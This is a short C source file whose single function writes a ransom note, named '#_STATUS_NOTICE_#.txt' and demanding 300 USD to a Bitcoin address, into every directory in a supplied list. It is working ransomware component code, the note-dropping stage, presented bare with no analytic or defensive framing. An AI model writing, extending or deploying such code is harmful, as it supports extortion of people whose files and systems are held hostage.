#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <limits.h>

void write_notices(const char **directories, size_t count) {
    const char *filename = "#_STATUS_NOTICE_#.txt";
    const char *content =
        "DEMAND: 300 USD\n"
        "PAYMENT ADDRESS: 1A1zP1eP5QGefi2DMPTfTL5SLmv7DivfNa\n"
        "CONTACT VIA SECURE CHANNEL IMMEDIATELY\n";

    for (size_t i = 0; i < count; i++) {
        const char *dir = directories[i];
        if (dir == NULL) continue;

        char path[PATH_MAX];
        int ret = snprintf(path, sizeof(path), "%s/%s", dir, filename);
        if (ret < 0 || (size_t)ret >= sizeof(path)) {
            /* path too long, skip silently */
            continue;
        }

        FILE *fp = fopen(path, "w");
        if (fp == NULL) {
            /* cannot create file, skip */
            continue;
        }

        fprintf(fp, "%s", content);
        fclose(fp);
    }
}